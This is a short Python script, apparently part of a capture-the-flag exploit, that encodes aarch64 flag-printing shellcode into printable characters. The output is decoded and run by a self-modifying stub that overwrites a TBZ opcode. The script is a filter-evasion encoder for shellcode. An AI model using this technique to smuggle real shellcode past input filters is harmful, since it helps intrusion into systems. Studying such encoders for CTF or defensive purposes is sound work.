#!/usr/bin/env python
# This file encodes the aarch64 flag printing shellcode into a format
# that the decoder ('aarch64-shellcode.S') can decode & execute.

def mkchr(c):
    return chr(0x40+c)

def main():
    # b'\xfe\x47\x36' are the 3 last bytes of the TBZ opcode in aarch64-shellcode.S
    # Because the unpacking start unpacking and overwriting over the TBZ opcode, we add
    # them here.
    s = ""
    p = b'\xfe\x47\x36' + open("aarch64-flag.shellcode", "rb").read()
    for i in range(len(p)):
        q = p[i]
        s += mkchr((q >> 4) & 0xf)
        s += mkchr(q & 0xf)
    s = s.replace('@', 'P')
    open("aarch64_print_flag_encoded.bin", "wb").write(s.encode('ascii'))

if __name__ == "__main__":
    main()